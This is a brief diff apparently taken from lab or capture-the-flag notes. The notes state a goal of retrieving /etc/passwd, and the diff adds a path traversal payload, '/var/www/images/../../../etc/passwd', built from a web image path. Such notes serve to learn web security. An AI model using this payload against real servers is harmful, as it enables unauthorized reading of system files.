@@ -5,3 +5,5 @@ Target Goal - Retrieve the contents of the /etc/passwd file.
 Analysis:
 
 /var/www/images/67.jpg
+
+use /var/www/images/../../../etc/passwd
